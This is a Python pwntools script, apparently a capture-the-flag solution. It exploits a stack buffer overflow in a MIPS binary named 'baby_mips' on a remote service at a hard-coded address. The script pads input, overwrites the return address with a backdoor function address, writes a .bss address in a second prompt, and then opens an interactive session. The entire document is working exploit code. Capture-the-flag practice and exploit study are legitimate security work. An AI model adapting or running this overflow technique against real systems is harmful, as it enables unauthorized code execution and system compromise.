from pwn import *
from struct import pack,unpack,calcsize
context.log_level = 'debug'
#libc=ELF("./libc.so.0")
elf = ELF('./baby_mips')
backdoor = 0x00400690
bss_name = 0x004923B0
io = remote("101.200.240.241",7030)
s       = lambda data               :io.send(str(data)) 
sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
sl      = lambda data               :io.sendline(str(data))
sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)

ru("What's your name?\n")
sl('1'*0x1c+pack("<I",backdoor))
ru("YaLeYaLeDaZe?(yaleyale/kotowalu)\n")
s('1'*8+pack("<I",bss_name))
io.interactive()